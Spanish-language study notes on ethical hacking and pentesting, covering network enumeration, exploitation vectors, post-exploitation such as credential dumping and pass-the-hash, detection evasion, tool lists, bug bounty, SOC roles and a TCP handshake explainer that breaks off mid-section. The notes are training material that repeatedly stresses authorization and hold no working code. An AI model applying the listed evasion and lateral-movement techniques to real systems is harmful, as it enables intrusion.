##### 4. Topología: traceroute, LLDP/CDP discovery, SNMP queries para mapear red


### Enumeración específica de servicios

SMB/Windows: enum4linux, smbclient, RPC enumeration, shares mal configurados.
LDAP/AD: ldapsearch, enumeración de usuarios/objetos, descubrimiento de controladores de dominio.
SNMP: snmpwalk/gets con community strings públicas para extraer configuración y tablas ARP.
DNS: ENUM, transferencias AXFR (si autorizadas), subdominio y registros SRV (importante para AD).
NTP/NetBIOS/MDNS: explotación de servicios mal configurados o amplificación


### Vectores comunes de explotación

##### 1. Credenciales débiles/reutilizadas y falta de MFA.
##### 2. Shares/servicios expuestos con permisos excesivos (SMB, NFS).
##### 3. Vulnerabilidades conocidas en servicios network‑facing (CVE exploitables).
##### 4. Configuraciones erróneas en routers/firewalls (ACLs permisivas, UPnP abierto).
##### 5. SNMP público, Telnet/FTP sin cifrar, protocolos obsoletos.
##### 6. DNS misconfigurado (zone transfers, subdomain takeover).
##### 7. VLAN hopping, ARP spoofing/poisoning (solo en laboratorio o con permiso).
##### 8. RDP/SSH accesibles con parches pendientes o sin hardening


Post‑explotación y persistencia en red:

Dump de credenciales (hashdump, Mimikatz en Windows con permiso de lab).
Lateral movement: Pass‑the‑Hash, Pass‑the‑Ticket, WMI, PSExec, RDP pivoting.
Pivoting/tunneling: establecer SOCKS proxy, SSH tunneling, port forwarding para acceder a segmentos internos.
Recolección: capturar tráfico, credenciales, ficheros sensibles, snapshots.


Detección y evasión (solo con autorización)

Timing y throttling para reducir detección.
Fragmentación/encoding y port‑randomization para evadir firmas.
Uso de herramientas “living off the land” (PowerShell/WMIC) para evitar binarios externos.
Documentar cómo las defensas detectan ataques y recomendaciones para mejorar detección


### Herramientas clave

##### 1. Discovery/escaneo: Nmap, masscan, arp-scan.
##### 2. Enumeración SMB/AD: enum4linux, bloodhound, crackmapexec, rpcclient.
##### 3. SNMP/DNS: snmpwalk, dig, dnsenum, fierce.
##### 4. Pivoting y post‑exploit: Metasploit (pivoting), SSH, socat, proxychains, responder (para LLMNR/NTLM relay en lab).
##### 5. Forensics y captura: tcpdump, Wireshark.
##### 6. Automatización: CrackMapExec, Impacket scripts (wmiexec, smbexec), PowerSploit


### Buenas prácticas y ética

Solo ejecutar pruebas dentro del scope y con autorización documentada.
Empezar con técnicas de bajo impacto y aumentar intensidad según acuerdo.
Evitar técnicas destructivas (denial of service, reboots) salvo autorización.
Mantener registros detallados (comandos, timestamps, outputs) y limpiar persistencia usada en pruebas.
Coordinar ventanas y notificar equipos pertinentes si hay riesgo de impacto


### Evaluación de riesgo y priorización

##### 1. Priorizar vectores explotables remotamente, con alto impacto en datos críticos o control de infraestructuras.
##### 2. Considerar probabilidad, impacto y detectabilidad al recomendar mitigaciones


### Mitigaciones habituales

##### 1. Forzar MFA y rotación de contraseñas; eliminar cuentas y credenciales por defecto.
##### 2. Minimizar servicios expuestos; segmentación de redes y least‑privilege en ACLs.
##### 3. Parcheado y gestión de vulnerabilidades; inventario y SBOM.
##### 4. Deshabilitar protocolos inseguros; usar TLS/SSH y hardening.
##### 5. Monitorización: habilitar logging, IDS/IPS, y alertas para patrones de lateral movement.
##### 6. Habilitar mitigaciones específicas: SMB signing, LDAP signing, HSTS, configuración segura en dispositivos de red
    

### Entregables esperados

Mapa de red validado y hosts críticos.
Lista de vectores explotados, evidencia y PoC controlada.
Credenciales y caminos de movimiento lateral (documentados).
Recomendaciones técnicas y plan de remediación priorizado


# 4. Pruebas de Penetración/Pen-Test

##### Implica simular ataques cibernéticos en sistemas informáticos para identificar vulnerabilidades que podrían ser explotadas por actores malintencionados

Son evaluaciones de seguridad que ayudan a las organizaciones a identificar y mitigar vulnerabilidades antes de que puedan ser explotadas por atacantes reales

Objetivos:

Identificar Vulnerabilidades: Localizar debilidades en el sistema, redes o aplicaciones.
Evaluar el Nivel de Riesgo: Clasificar las vulnerabilidades encontradas y su potencial impacto.
Verificar Controles de Seguridad: Comprobar la efectividad de las medidas de seguridad implementadas.
Cumplimiento Normativo: Asegurar que la organización cumple con regulaciones y estándares de la industria

Fases de las Pruebas de Penetración:
Se descomponen en varias fases:

1. Reconocimiento

Objetivo: Recolección de información sobre el sistema objetivo.
Métodos: Escaneo de redes, recopilación de datos públicos, análisis de servicios expuestos.

2. Escaneo

Objetivo: Identificación activa de vulnerabilidades en sistemas.
Herramientas: Escáneres de vulnerabilidades como Nessus o OpenVAS

3. Explotación

Objetivo: Intentar acceder al sistema aprovechando las vulnerabilidades descubiertas.
Técnicas: Utilización de exploits para obtener acceso no autorizado

4. Post-explotación

Objetivo: Determinar el impacto del acceso obtenido.
Actividades: Escalada de privilegios, persistencia y exfiltración de datos.

5. Informe

Objetivo: Documentar los hallazgos, técnicas utilizadas, y recomendaciones para mitigar vulnerabilidades.
Contenido: Descripción de las vulnerabilidades, riesgo, y acciones recomendadas    


### Metodologías y Estándares

Existen varias metodologías y estándares reconocidos para realizar pruebas de penetración, incluyendo:

##### 1. OWASP Testing Guide: Enfocado en la seguridad de aplicaciones web.

##### 2. NIST SP 800-115: Proporciona un marco para pruebas de seguridad.

##### 3. PTES (Penetration Testing Execution Standard): Ofrece un enfoque estructurado para pen-tests.


### Herramientas Comunes en Pen-Tests

Metasploit:	Plataforma para desarrollo y ejecución de exploits.
Nmap: Herramienta para escaneo de redes y descubrimiento de hosts.
Burp Suite:	Herramienta para pruebas de seguridad en aplicaciones web.
Kali Linux:	Distribución de Linux que incluye numerosas herramientas de penetración

`Escaneo y reconocimiento`: nmap, masscan, amass, sublist3r.
`Enumeración`: enum4linux, ldapsearch, gobuster/dirb.
`Análisis de vulnerabilidades`: Nessus, OpenVAS, Nikto.
`Explotación`: Metasploit, sqlmap, exploit-db.
`Post-explotación`: Mimikatz, BloodHound, responder.
`Testing de aplicaciones web`: Burp Suite, OWASP ZAP.
`Automatización y scripting`: Python, PowerShell, bash


Ética y Legalidad:

Es crucial que las pruebas de penetración se realicen bajo un marco legal y ético claro:

Consentimiento: Obtener permiso explícito de la organización objetivo.
Confidencialidad: Respetar la privacidad y seguridad de la información sensible.
Documentación: Registrar todas las actividades y hallazgos de manera transparente


Autorización y legalidad:

Autorización escrita: Contrato o acuerdo de autorización (Rules of Engagement, statement of work) firmado por dueño del activo.
Cumplimiento legal: Revisar leyes locales, normativas sectoriales y políticas internas; evitar actividades que incumplan regulaciones


### Tipos de pruebas

`Black-box`:
Sin información previa; simula atacante externo.

`White-box`:
Acceso completo a arquitectura, código, credenciales; permite pruebas profundas.

`Gray-box`:
Información parcial (por ejemplo, credenciales de usuario); equilibra realismo y eficiencia.

`Red Team vs Pen-Test`:
Red Team es adversarial, orientado a objetivos amplios; pen-test es evaluación técnica enfocado en vulnerabilidades concretas


### Metodología general (fases)

1. `Planeación y reconocimiento`:
Recolección de información pública (OSINT), mapeo de activos, identificación de direcciones IP, subdominios, tecnología y perfiles.

2. `Enumeración`:
Descubrimiento activo: escaneo de puertos (nmap), servicios, versiones, rutas, cuentas y entradas expuestas.

3. `Análisis de vulnerabilidades`:
Identificación de fallos conocidos (CVE), configuraciones débiles, inyección, desbordamientos, credenciales débiles, exposición de datos.

4. `Explotación`:
Uso controlado de exploits para confirmar vulnerabilidades y demostrar impacto; privilegios mínimos necesarios y medidas para evitar daño.

5. `Escalada de privilegios`:
Intentos de subir privilegios a nivel local o en red para evaluar impacto posterior a la explotación inicial.

6. `Movimiento lateral y persistencia`:
(Solo si forma parte del alcance) Evaluar la capacidad de un atacante para moverse dentro de la red y mantener acceso.

7. `Exfiltración y evaluación del impacto`:
Demostrar potencial de extracción de datos, interrupción de servicios o compromisos críticos, sin causar daño real.

8. `Remediación y reporte`:
Informe técnico y ejecutivo: vulnerabilidades, evidencias, riesgo (CVSS o criterio acordado), pasos de mitigación y recomendaciones.

9. `Validación posterior (re-testing`:
Verificar que las correcciones fueron aplicadas y que la vulnerabilidad ya no es explotable


### Principios de seguridad operativa (OPSEC)

Minimizar impacto: pruebas fuera de horas críticas si aplica, backups, usar entornos de staging cuando sea posible.

Registro y monitoreo: mantener logs detallados de acciones para auditoría y revertir cambios.

Segregación de datos sensibles: no exfiltrar datos reales salvo autorización explícita y medidas de protección


### Clasificación y priorización de vulnerabilidades

Usar criterios objetivos: CVSSv3, criticidad del activo, explotabilidad, impacto en confidencialidad, integridad y disponibilidad (CIA).
Priorizar mitigaciones prácticas: parcheo, hardening, compensating controls, retesting


### Técnicas comunes evaluadas

Autenticación débil y gestión de sesiones
Inyecciones (SQL, Command, LDAP, etc.)
Cross-Site Scripting (XSS) y CSRF
Deserialización insegura
Configuraciones inseguras (exposición de puertos, servicios innecesarios)
Gestión de secretos y credenciales (hardcoded keys, repositorios públicos)
Control de acceso y escalada de privilegios
Vulnerabilidades en software de terceros y dependencias


### Consideraciones específicas por tipo de activo

`Aplicaciones web`: patrones OWASP Top 10, pruebas de lógica de negocio.

`APIs`: control de acceso, validación de entradas, rate limiting.

`Infraestructura de red`: segmentación, firewalls, IDS/IPS, servicios expuestos.

`Entornos cloud`: gestión de identidades, políticas IAM, almacenamiento público, configuración de buckets.

`Aplicaciones móviles`: almacenamiento seguro, comunicaciones, API backend.

`IoT/embebidos`: firmware, interfaces físicas, actualizaciones seguras.


### Reporte y comunicación

Informe ejecutivo: resumen de riesgos, impacto al negocio y recomendaciones priorizadas.
Informe técnico: hallazgos detallados, evidencia (capturas, PoC), pasos para reproducir, mitigaciones sugeridas.
Plan de remediación: acciones, responsables y plazos.
Entrega y seguimiento: reunión de cierre, retesting y verificación de mitigaciones
    

### Ética y responsabilidades

Mantener confidencialidad de hallazgos.
No divulgar vulnerabilidades a terceros sin consentimiento.
Actuar según el principio de mínimo privilegio y evitar explotación innecesaria.
Transparencia con el cliente sobre riesgos y limitaciones de la prueba


### Métricas y mejora continua

Medir tiempo de descubrimiento, número de vulnerabilidades críticas, tiempo de corrección (MTTR), cobertura de activos.
##### Integrar hallazgos en ciclo de desarrollo (DevSecOps), pruebas automatizadas y programa de bug bounty cuando aplique



# Bug bounty: programa de recompensas por errores

##### Programa formal donde una organización invita a investigadoras/os externas/os a encontrar y reportar vulnerabilidades a cambio de una recompensa  (dinero, reconocimiento u otros incentivos).

##### Objetivos: Detectar vulnerabilidades antes de que sean explotadas, ampliar la cobertura de pruebas usando la comunidad, y mejorar la seguridad de forma costo-efectiva


Modelos comunes:

Público: cualquier investigador puede participar.
Privado / por invitación: solo investigadores seleccionados.
Coda‑style / híbrido: comienza privado y luego se abre públicamente

Alcance y reglas (must):

Alcance definido: activos, dominios, APIs, entornos; lo que está explícitamente fuera de alcance.
Reglas de compromiso: técnicas permitidas/prohibidas, pruebas de intrusión, límites de impacto.
Política de divulgación: cómo y cuándo reportar, información requerida en un informe.
Requisitos legales: autorización explícita y cláusulas de no-persecución para investigadores que sigan las reglas

Clasificación y recompensa:

Severidad: normalmente basada en CVSS, impacto en CIA (Confidencialidad, Integridad, Disponibilidad) y explotabilidad.
Recompensas variables: desde simbólicas hasta altas sumas por fallos críticos; a veces crédito público o swag


### Proceso típico:

##### 1. Investigador descubre y valida vulnerabilidad.

##### 2. Reporte privado a la plataforma o equipo interno (detalles, PoC, pasos para reproducir).

##### 3. Triage por el equipo de seguridad (confirmación y clasificación).

##### 4. Mitigación y parcheo por el propietario del activo.

##### 5. Pago de la recompensa y/o publicación del hallazgo según política


Plataformas populares (ejemplos):
HackerOne, Bugcrowd, Synack, Open Bug Bounty

Ventajas:

Amplía el alcance de detección.
Coste basado en resultados.
Acceso a talento diverso y tácticas creativas

### Riesgos y desafíos:

##### Calidad variable de reportes (falsos positivos, PoC incompletos).
##### Gestión de volumen y triage costoso.
##### Riesgo operativo si reglas o límites no están claros (impacto en producción).
##### Posible exposición de datos sensibles si no hay controles    


### Buenas prácticas para organizaciones:

##### 1. Definir alcance y reglas claras; ofrecer autorización legal.
##### 2. Establecer proceso de triage y SLAs para respuesta.
##### 3. Pagar recompensas justas y transparentes.
##### 4. Integrar hallazgos en SDLC/patching y retesting.
##### 5. Proteger datos sensibles (exigir no exfiltrar datos reales).


### Buenas prácticas para investigadores:

##### 1. Leer y seguir la política del programa.
##### 2. Evitar pruebas destructivas y exfiltración de datos sensibles.
##### 3. Proveer PoC reproducible y pasos claros.
##### 4. Ser profesional en comunicaciones y esperar tiempos razonables antes de divulgación pública

# Proyectos

### Proyectos introductorios (bajo riesgo, buen aprendizaje)

1. Escaneo de vulnerabilidades en red de laboratorio
- Herramientas: nmap, masscan, OpenVAS.
- Entregable: lista de hosts/puertos, vulnerabilidades con CVSS y pasos recomendados.

2. Hardening de una máquina Linux/Windows
- Tareas: aplicar guías CIS, deshabilitar servicios innecesarios, configurar firewall y auditoría.
- Entregable: checklist antes/después y script de hardening.

3. Revisión básica de contraseñas y políticas IAM
- Tareas: analizar políticas de contraseñas, listas de cuentas con contraseñas débiles, MFA cobertura.
- Entregable: informe con hallazgos y plan de remediación.

4. Configuración y pruebas de un entorno de pruebas (lab)
- Tareas: desplegar máquinas virtuales, simular AD/DMZ, herramientas de pentest.
- Entregable: documentación del lab y scripts de despliegue (Terraform/Vagrant).

5. Auditoría de logs y alertas básicas
- Tareas: revisar qué logs se recolectan, crear alertas SIEM simples (failed logins, escaladas).
- Entregable: reglas de detección y playbook de respuesta simple.


### Proyectos intermedios (mayor impacto técnico)

6. Prueba de penetración de una aplicación web interna (gray-box)
- Herramientas: Burp Suite, OWASP ZAP, sqlmap.
- Entregable: PoC, pasos para reproducir, recomendaciones priorizadas.

7. Revisión de seguridad de una API REST
- Tareas: autenticación/autorization, rate limiting, validación inputs, exposiciones CORS.
- Entregable: listado de fallos y pruebas automatizadas (Postman/pytest).

8. Pentest básico de Active Directory
- Tareas: descubrimiento, Kerberoastable accounts, políticas de contraseñas, ACLs.
- Entregable: vector de ataque documentado y mitigaciones.

9. Análisis de configuración cloud (AWS/Azure/GCP)
- Herramientas: ScoutSuite, Prowler, GCP CIS Benchmarks.
- Entregable: reporte de misconfiguraciones críticas (buckets públicos, IAM excesivo).

10. Código seguro: revisión de pull requests críticos
- Tareas: revisar PRs en repositorio para usos inseguros (injection, logging secretos).
- Entregable: checklist de revisión y ejemplos corregidos.


### Proyectos orientados a procesos y mejora organizacional

11. Programa de divulgación/bug-bounty interno o política de reporte de vulnerabilidades
- Tareas: crear plantilla de reporte, reglas de alcance y proceso de triage.
- Entregable: política y flujo de escalado.

12. Runbook/Playbooks de respuesta a incidentes para incidentes comunes
- Tareas: credential compromise, ransomware sospecha, fuga de datos.
- Entregable: playbooks paso a paso y checklist para SOC.

13. Integración de pruebas de seguridad en CI/CD (SAST/DAST)
- Herramientas: SonarQube, Bandit, Trivy, OWASP ZAP en pipeline.
- Entregable: jobs de CI con fallos que bloquean merge y documentación.

14. Programa de concienciación y phishing simulado
- Tareas: campañas de phishing controlado, métricas de clics/reportes y formación.
- Entregable: informe de resultados y plan de entrenamiento.


### Proyectos prácticos con impacto demostrable

15. Implementación de monitoreo de integridad (HIDS) en endpoints
- Herramientas: OSSEC/Wazuh, osquery.
- Entregable: despliegue piloto, reglas de detección y alertas.

16. Revisión y rotación de secretos/keys
- Tareas: identificar secretos en repos, despliegue de vault (HashiCorp/Secrets Manager).
- Entregable: inventario de secretos, plan de rotación, integración CI.

17. Simulación de phishing + red team light (controlado)
- Tareas: envío de emails de prueba, seguimiento de clicks, escalada a compromisos básicos (sin dañar).
- Entregable: métricas, PoC limitado y recomendaciones.

18. Informe de riesgo técnico para un servicio crítico
- Tareas: mapeo de activos, threat modeling (STRIDE), análisis de impacto y mitigaciones.
- Entregable: informe ejecutivo + backlog de mitigaciones priorizadas.

Consejos prácticos para ejecutar y presentar el primer trabajo
- Prioriza seguridad baja-impacto y autorización formal antes de cualquier test.
- Produce entregables claros: executive summary (1 pág.), informe técnico y PoC reproduccible.
- Automatiza todo lo posible (scripts, pipelines) para mostrar reproducibilidad.
- Mide impacto (nº vulnerabilidades críticas, tiempo medio de remediación) y propone SLAs.
- Incluye pasos de mitigación concretos y pruebas de verificación (re-testing).
- Documenta permisos, horas de pruebas y backups para OPSEC.

### 1. Preparación y autorización
1. **Definir objetivo y alcance:** listar IPs, dominios, aplicaciones, APIs y entornos incluidos y excluidos.  
2. **Obtener autorización escrita:** Rules of Engagement / SOW firmada por propietario del activo.  
3. **Establecer límites de impacto:** ventanas de prueba, horas permitidas, backups y contacto de emergencia.  
4. **Identificar stakeholders y SLAs:** responsables técnicos, equipo de respuesta, plazos de triage y remediación.  

### 2. Planificación y recursos
5. **Seleccionar metodología y herramientas:** (SAST/DAST, nmap, Burp, Nessus, etc.).  
6. **Preparar entorno de pruebas:** lab/local replicado si es posible; cuentas de prueba con permisos adecuados.  
7. **Configurar registro:** centralizar logs de prueba, habilitar snapshots/backups, registrar todas las acciones.  
8. **Checklist de OPSEC:** IPs de origen autorizadas, claves/credenciales seguras, no exfiltrar datos reales sin permiso.

### 3. Reconocimiento (OSINT)
9. **Recolectar información pública:** subdominios, certificados, records DNS, WHOIS, tecnologías detectadas.  
10. **Mapear superficie de ataque:** inventario de endpoints, servicios expuestos, versiones.

### 4. Enumeración activa
11. **Escaneo de puertos y servicios:** ejecutar nmap/masscan, identificar servicios y versiones.  
12. **Enumeración de aplicaciones:** directorios/endpoints (gobuster/dirb), APIs, parámetros, endpoints debug.  
13. **Revisión de configuración y credenciales:** servicios públicos, buckets/almacenamiento, usuarios con privilegios.

### 5. Análisis de vulnerabilidades
14. **Ejecutar escáneres automatizados:** Nessus/OpenVAS/Trivy, revisar falsos positivos.  
15. **Revisión manual focalizada:** pruebas OWASP Top10 para web, inyección, XSS, CSRF, autenticación, control de acceso.  
16. **Priorizar hallazgos:** asignar severidad (CVSS o criterio acordado) y impacto en CIA.

### 6. Explotación controlada (si está en alcance)
17. **Validar vulnerabilidades con PoC seguro:** exploits mínimos para confirmar, evitar daño permanente.  
18. **Escalada de privilegios limitada:** documentar cada paso; detener si riesgo de impacto alto.  
19. **Movimiento lateral y persistencia (solo si autorizado):** pruebas controladas y revertibles.

### 7. Post-explotación y evidencia
20. **Recolectar evidencia:** capturas, logs, PoC reproducible, timestamps; anonimizar datos sensibles.  
21. **Medir impacto:** datos accesibles, cuentas comprometidas, posible disponibilidad/privacidad afectada.

### 8. Remediación y recomendaciones
22. **Proponer mitigaciones concretas:** pasos técnicos, configuración, parches, compensating controls.  
23. **Clasificar acciones por prioridad:** inmediatas (bloqueo/mitigación), corto plazo (configuración), largo plazo (arquitectura).  
24. **Incluir pruebas de verificación:** cómo re-testear y criterios de éxito.

### 9. Reporte y comunicación
25. **Crear informe ejecutivo (1 pág.):** resumen de riesgos críticos y acciones urgentes.  
26. **Crear informe técnico:** hallazgos, evidencia, PoC, pasos para reproducir y mitigaciones detalladas.  
27. **Entregar y presentar:** reunión con stakeholders, Q&A y plan de seguimiento.

### 10. Retesting y cierre
28. **Retesting tras mitigaciones:** verificar que vulnerabilidades ya no son explotables.  
29. **Actualizar inventario y lecciones aprendidas:** incorporar cambios a procesos/SDLC.  
30. **Archivado y limpieza:** eliminar cuentas/créditos creados, borrar artefactos temporales, conservar evidencia según políticas.

# Networking

1. Modelos y conceptos básicos

### Modelo OSI y TCP/IP
Capas (Físico, Enlace, Red, Transporte, Sesión, Presentación, Aplicación)
mapeo TCP/IP (Link, Internet, Transport, Application).

### Direcciones y subredes
IPv4, IPv6, netmasks, CIDR, broadcast, gateway 

### ARP y NDP
resolución IP→MAC (ARP en IPv4, NDP en IPv6).


2. Protocolos clave

### Nivel Red: IP, ICMP (ping, traceroute).

### Nivel Transporte: TCP (handshake, flags, estados), UDP (sin conexión).

### Nivel Aplicación: HTTP/HTTPS, DNS, SMTP, SSH, FTP, SMB, LDAP, RDP, APIs REST.

### Protocolos de enrutamiento y descubrimiento: BGP, OSPF, ARP, LLDP.


3. Conceptos de seguridad y vectores de red

### Escaneo y fingerprinting
detección de hosts, puertos y servicios (nmap, masscan); fingerprinting de SO y versiones

### Enumeración de servicios
identificar versiones, banners, usuarios y recursos accesibles

### Ataques sobre la capa de red
ARP spoofing/poisoning, DNS spoofing, IP spoofing, man-in-the-middle (MitM), packet sniffing.

### Ataques sobre transporte y aplicación
TCP SYN flood (DoS), session hijacking, TCP reset, amplification attacks (DNS/UDP).

### Explotación de servicios mal configurados
servicios expuestos, versiones vulnerables, credenciales por defecto.


4. Herramientas y técnicas comunes

### Escaneo y discovery: nmap, masscan, arp-scan.

### Enumeración y fuzzing: enum4linux, smbclient, curl, gobuster, wfuzz.

### Interceptación y proxying: Wireshark, tcpdump, mitmproxy, Bettercap, Burp Suite (HTTP/HTTPS).

### Explotación y post-explotación: Metasploit, responder (NBNS/LLMNR poisoning), Responder, Mimikatz (credenciales), BloodHound (AD).

### Herramientas de red ofensiva/defensiva: netcat, socat, iptables/nftables, ncat, traceroute, hping3


5. Redes empresariales: conceptos

### Segmentación y VLANs
separación de tráfico, routing entre VLANs, riesgos por mala segmentación

### Firewalls y listas de control (ACL)
estados, reglas, NAT, filtrado de puertos.

### VPN y túneles
IPSec, OpenVPN, TLS tunnels; riesgos de configuración y credenciales.

### Active Directory y servicios Windows
roles (DC, AD), Kerberos, SMB, LDAP, ataques específicos (Kerberoasting, Pass-the-Hash, NTLM relay).

### Infraestructura cloud y redes virtuales


6. Monitoreo, detección y evasión

### Detección: IDS/IPS (Snort, Suricata), logs de red, NetFlow, EDR/NDI.

### Evasión: fragmentación de paquetes, proxying, uso de protocolos normales (HTTP/HTTPS), timing/pacing, cifrado/obfuscación.

### OPSEC en pruebas: evitar impacto en producción, usar IPs autorizadas, respetar RoE


7. Análisis de tráfico y captura de evidencia

### Captura y filtrado
tcpdump, Wireshark, tshark; filtros BPF, reensamblado de sesiones.

### Inspección de protocolos seguros
técnicas para analizar TLS (SNI, certificados, uso de proxies con certificados propios si autorizado).

### Recolección de PoC
paquetes relevantes, logs, timestamps y contexto reproducible


8. Prácticas defensivas

### Hardenizar servicios de red: cerrar puertos innecesarios, aplicar parches y versiones seguras.

### Segmentación y principio de menor privilegio: microsegmentación y ACL estrictas

### Autenticación fuerte y rotación de claves: MFA, gestión de secretos, certificados.

### Monitorización continua y alertas: detectar patrones anómalos, recon y scans

### Cifrado en tránsito y políticas TLS: evitar versiones y suites débiles, HSTS, certificados válidos


9. Consideraciones legales y operativas

Autorización: no realizar pruebas sin permiso escrito.

Impacto: planificar ventanas, backups y contacto de emergencia.

Registro: documentar acciones, IPs usadas y evidencia para auditoría.


10. Aplicar fundamentos en Pentesting

`Mapear superficie (discovery) → enumerar servicios → identificar vulnerabilidades →`
`explotar con control → recolectar evidencia → recomendar mitigaciones → retestear.`



# Red team, blue team, purple team, pentesting, hacking ético

### Red Team

##### Equipo ofensivo que simula atacantes reales con objetivos estratégicos (comprometer activos críticos, persistencia, evasión).

Alcance amplio y objetivo-driven; usa técnicas avanzadas, OPSEC y multi-vector (phishing, lateral movement, exfil).

Resultado: evidencia realista de impacto y brechas en detección/respuesta


### Blue Team

##### Equipo defensivo encargado de proteger, detectar, responder y recuperar ante incidentes.

Responsabilidades: monitoreo (SIEM/IDS), hardening, detección de intrusos, playbooks IR, forense y remediación.

Métrica: tiempo de detección (MTTD), tiempo de respuesta (MTTR), reducción de riesgo


### Purple Team

##### Colaboración entre Red y Blue para mejorar postura: red comparte tácticas y PoC; blue valida detecciones y refina controles.

Objetivo: cerrar la brecha entre ofensiva y defensiva mediante ejercicios iterativos, tuning de detecciones y transferencia de conocimiento.

Forma: puede ser reunión/ejercicio continuo o rol híbrido dentro del equipo.


### Penetration Testing (Pen-Test)

##### Evaluación técnica con alcance definido para identificar vulnerabilidades explotables en sistemas, aplicaciones o redes.

Características: normalmente tiempo-bounded, entregables formales (informe ejecutivo/técnico), foco en vulnerabilidades verificables y mitigaciones.

Enfoque: técnicas técnicas y pruebas controladas; no necesariamente objetivo-driven ni centrado en evasión a largo plazo.


### Hacking Ético

Principio/actividad de usar técnicas de hacking con autorización para mejorar seguridad.

Incluye pen-tests, ejercicios de Red Team, vulnerability research, bug bounties y consultoría de seguridad.

Requisitos: autorización, legalidad, ética profesional, reporte responsable y no divulgación sin permiso
 

### Comparación

Red Team: ofensiva realista, objetivo-driven, alto impacto, evalúa detección/respuesta.

Pen-Test: evaluación técnica limitada, vulnerabilidades y PoC, alcance y tiempo definidos.

Blue Team: defensiva continua, detección/respuesta y remediación.

Purple Team: puente colaborativo para mejorar detecciones y controles.

Hacking Ético: paraguas que engloba todas las actividades autorizadas para mejorar seguridad


### En cada campo

Quieres comprobar si tu SOC detecta intrusiones reales → Red Team.

Necesitas inventario de vulnerabilidades en una app antes de lanzamiento → Pen-Test.

Mejorar reglas SIEM y playbooks con ejercicios prácticos → Purple Team.

Operaciones diarias de seguridad y respuesta → Blue Team.

Contratar testers externos para recompensas por hallar fallos → Bug bounty (dentro de hacking ético).

# SOC: Centro de Operaciones de Seguridad

Unidad organizativa responsable de detectar, analizar y responder a incidentes de seguridad en tiempo real para proteger activos digitales, datos y servicios

Monitoreo 24/7: ingestión y correlación de logs y telemetría (SIEM, XDR).
Detección: reglas, firmas y análisis de comportamiento para identificar amenazas (IDS/IPS, detección basada en UEBA).
Respuesta a incidentes (IR): triage, contención, erradicación y recuperación según playbooks.
Investigación forense: análisis de eventos, recolección de evidencia y root cause analysis.
Hunting proactivo: búsqueda de amenazas no detectadas mediante hipótesis y análisis manual.
Gestión de alertas y escalado: priorización (Triage), SLAs y coordinación con equipos (IT, legal, comunicación).
Mejora continua: tuning de detecciones, integración de inteligencia de amenazas (TI), lecciones aprendidas

Componentes técnicos:

`SIEM / XDR`: ingesta, normalización, correlación y almacenamiento de eventos.
`EDR`: detección y respuesta en endpoints.
`Network Detection (NDR) / IDS/IPS`: visibilidad y detección en red.
`Threat Intelligence`: feeds y contextos para enriquecer alertas.
`Orquestación y automatización (SOAR)`: playbooks automatizados para respuesta y enriquecimiento.
`Log sources`: firewalls, proxies, AD, VPN, cloud, apps, endpoints, IDS, threat feeds

Roles típicos en un SOC:

Analista N1 (Tier 1): triage y primeras investigaciones de alertas.
Analista N2 (Tier 2): investigación profunda, hunting y escalado.
Analista N3 / Responder (Tier 3): IR avanzado, forense y mitigación.
Threat Hunter / CTI: investigación proactiva y consumo/producción de threat intelligence.
SOC Manager: coordinación, KPIs, procesos y relación con stakeholders.
Ingeniería SOC: integración de herramientas, reglas y automatización

KPIs y métricas comunes:

MTTD (Mean Time to Detect)
MTTR (Mean Time to Respond/Recover)
Número de alertas por día / tasa de falsos positivos
Tiempo medio de contención, % de incidentes resueltos dentro del SLA

Buenas prácticas:

Centralizar logs y conservar retención adecuada.
Implementar playbooks claros y practicar tabletop exercises.
Automatizar tareas repetitivas con SOAR para reducir falsos positivos.
Mantener pipelines de threat intelligence y compartir IOC/TTP.
Medir y mejorar MTTD/MTTR y capacitar continuamente al personal

Modelos de operación

In-house SOC: control total, mayor coste.
MSSP / SOC as a Service: externalizado, coste predecible.
Hybrid: combinación de capacidades internas y servicio externo

## Three-Way Handshake

##### Cómo TCP crea una conexión confiable antes de enviar datos.
Esto es conocimiento clave nivel networking / backend / sistemas.

##### Proceso mediante el cual dos computadoras acuerdan iniciar una conexión TCP.

##### Antes de enviar datos, TCP necesita asegurarse de: ambos lados están disponibles; ambos pueden enviar y recibir; ambos sincronizan números de secuencia 

##### Sin esto, TCP no podría garantizar orden ni confiabilidad.


Ej: como una llamada telefónica

```
Cliente: ¿Hola? (SYN)
Servidor: Sí, te escucho (SYN-ACK)
Cliente: Perfecto, empezamos (ACK)
```
Ahora la conversación puede comenzar.


Las 3 etapas:

### 1. SYN (Synchronize)

El cliente quiere iniciar conexión.

Envía un paquete: SYN

Significa: “Quiero conectarme contigo y este será mi número inicial.”


##### Incluye: número de secuencia inicial (ISN), puerto origen, puerto origen

```
Cliente → Servidor
SYN, Seq = 1000
```


### 2. SYN-ACK

El servidor responde: SYN + ACK

##### Significa: recibí tu solicitud, acepto conexió, este es MI número inicial

```
Servidor → Cliente
SYN-ACK
Seq = 5000
Ack = 1001
```
El ACK confirma el SYN del cliente.


### 3. ACK

El cliente confirma: ACK

Ej:

```
Cliente → Servidor
ACK
Ack = 5001
```

##### Ahora: La conexión TCP está establecida

```
Cliente                        Servidor
   | -------- SYN -----------> |
   | <------ SYN-ACK --------- |
   | -------- ACK -----------> |
   |                           |
   | ===== CONEXIÓN ABIERTA ===|
```

##### Después de esto recién empiezan los datos HTTP, SSH, etc.


### Motivo de los 3 pasos: TCP necesita confirmar dos direcciones: Cliente - Servidor y viceversa

| Dirección          | Confirmación |
| ------------------ | ------------ |
| Cliente → Servidor | SYN          |
| Servidor → Cliente | SYN-ACK      |
| Confirmación final | ACK          |

##### Asegura: sincronización bidireccional, evitar conexiones fantasma, evitar paquetes viejos de la red


### Números de secuencia: TCP numera cada byte transmitido.

El handshake establece: `punto inicial de numeración`

Ej: Cliente empieza en 1000, Servidor empieza en 5000

##### Desde ahí TCP puede:, reordenar paquetes, detectar pérdidas, pedir retransmisión


### Nivel sistema: internamente

#### Al hacer una petición: Ej: curl google.cm

##### 1. DNS obtiene IP
##### 2. Kernel crea socket TCP
##### 3. Envía SYN
##### 4. Espera SYN-ACK
##### 5. Envía ACK
##### 6. Recién ahora HTTP empieza
 

### Estados TCP: Muy Importante

Durante el handshake, el socket pasa por estados:

| Estado       | Significado        |
| ------------ | ------------------ |
| CLOSED       | sin conexión       |
| SYN-SENT     | cliente envió SYN  |
| SYN-RECEIVED | servidor respondió |
| ESTABLISHED  | conexión activa ✅  |

##### ESTABLISHED = handshake completado.


### Comandos en linux 

```
ss -t
```

o

```

```

Vas a ver:

```

```
Son estados TCP reales.


### Problema famoso: SYN Flood (ataque)

El handshake también explica un ataque clásico:

#### SYN Flood

